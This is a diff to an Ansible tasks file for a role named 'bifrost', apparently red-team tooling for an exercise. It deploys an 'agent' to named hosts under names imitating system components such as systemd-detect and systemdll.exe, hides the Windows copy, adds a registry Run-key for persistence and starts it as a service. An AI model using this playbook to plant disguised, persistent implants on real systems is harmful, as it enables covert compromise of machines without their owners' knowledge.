@@ -2,86 +2,86 @@
 # tasks file for bifrost
 - name: BIFROST | Copy agent | Rocky Linux
   copy:
-    src: 'files/systemd-detect'
-    dest: /usr/bin/systemd-detect
+    src: 'files/{{ bifrost_linux_binary }}'
+    dest: "{{ bifrost_linux_location }}"
     mode: 755
   when: inventory_hostname_short == "orca" or inventory_hostname_short == "albatross"
 
 
 - name: BIFROST | Copy agent | FreeBSD
   copy:
-    src: 'files/valkyrae'
-    dest: /usr/bin/systemd-journal
+    src: 'files/{{ bifrost_freebsd_binary }}'
+    dest: "{{ bifrost_freebsd_location }}"
     mode: 755
-  when: ansible_os_family == "FreeBSD"
+  when: inventory_hostname_short == "pipeline"
 
 
 - name: BIFROST | Copy agent | Windows
   copy:
-    src: "files/systemdll.exe"
-    dst: "C:\\ProgramData\\systemdll.exe"
-  when: ansible_os_family == "Windows"
+    src: "files/{{ bifrost_windows_binary }}"
+    dest: "{{ bifrost_windows_location }}"
+  when: inventory_hostname_short == "squid" or inventory_hostname_short == "penguin" or inventory_hostname_short == "sealion"or inventory_hostname_short == "drill" or inventory_hostname_short == "tank"
 
 
 - name: BIFROST | Copy agent | Raspi
   copy:
-    src: 'files/systemd-gpio'
-    dst: /usr/bin/systemd-detect
+    src: 'files/{{ bifrost_pi_binary }}'
+    dest: "{{ bifrost_linux_location }}"
     mode: 755
   when: inventory_hostname_short == "whale"
 
 
 - name: BIFROST | Hide agent | Windows
-  win_command: "attrib +h 'C:\\ProgramData\\systemdll.exe'"
-  when: ansible_os_family == "Windows"
+  win_command: "attrib +h '{{ bifrost_windows_location }}'"
+  when: inventory_hostname_short == "squid" or inventory_hostname_short == "penguin" or inventory_hostname_short == "sealion"or inventory_hostname_short == "drill" or inventory_hostname_short == "tank"
 
 
 - name: BIFROST | Add run key persistence | Windows
   win_regedit: 
     path: 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run'
-    name: "systemdll.exe"
-    data: "cmd.exe /c 'C:\\ProgramData\\systemdll.exe'"
+    name: "{{ bifrost_windows_binary }}"
+    data: "cmd.exe /c '{{ bifrost_windows_location }}'"
     type: string
-  when: ansible_os_family == "Windows"
+  when: inventory_hostname_short == "squid" or inventory_hostname_short == "penguin" or inventory_hostname_short == "sealion"or inventory_hostname_short == "drill" or inventory_hostname_short == "tank"
 
 
 - name: BIFROST | Copy Bifrost service | Rocky & Arch
   copy:
-    src: 'files/systemd-detect.service'
-    dest: /etc/systemd/system/systemd-detect.service
+    src: 'files/{{ bifrost_linux_service }}'
+    dest: "{{ bifrost_linux_service_location }}"
   when: inventory_hostname_short == "orca" or inventory_hostname_short == "albatross"
 
 
 - name: BIFROST | Copy Bifrost service | FreeBSD
   copy:
-    src: 'files/systemd-journal.sh'
-    dest: /usr/local/etc/rc.d/systemd-journal.sh
+    src: 'files/{{ bifrost_freebsd_service }}'
+    dest: "{{ bifrost_freebsd_service_location }}"
     mode: 755
-  when: ansible_os_family == "FreeBSD"
+  when: inventory_hostname_short == "pipeline"
 
 
 - name: BIFROST | Copy Bifrost service | Raspi
   copy:
-    src: 'files/systemd-detect.service'
-    dest: /etc/systemd/system/systemd-detect.service
+    src: 'files/{{ bifrost_linux_service }}'
+    dest: "{{ bifrost_linux_service_location }}"
     mode: 755
   when: inventory_hostname_short == "whale"
 
 
 - name: BIFROST | Enable and start Bifrost service | Rocky & Arch
-  shell: systemctl enable systemd-detect && systemctl restart systemd-detect
+  shell: systemctl enable {{ bifrost_linux_binary }} && systemctl restart {{ bifrost_linux_binary }}
   when: inventory_hostname_short == "orca" or inventory_hostname_short == "albatross"
 
 
 - name: BIFROST | Enable and start Bifrost service | FreeBSD
-  shell: /usr/local/etc/rc.d/systemd-journal.sh
-  when: ansible_os_family == "FreeBSD"
+  shell: "{{ bifrost_freebsd_service }}"
+  when: inventory_hostname_short == "pipeline"
 
 
 - name: BIFROST | Run agent | WIndows
-  win_shell: 'runas /trustlevel:0x20000 systemdll.exe'
+  win_shell: 'runas /trustlevel:0x20000 {{{ bifrost_windows_binary }}}'
   async: 45
   poll: 0
   args:
     chdir: 'C:\\ProgramData'
-  when: ansible_os_family == "Windows"
+  when: inventory_hostname_short == "squid" or inventory_hostname_short == "penguin" or inventory_hostname_short == "sealion"or inventory_hostname_short == "drill" or inventory_hostname_short == "tank"
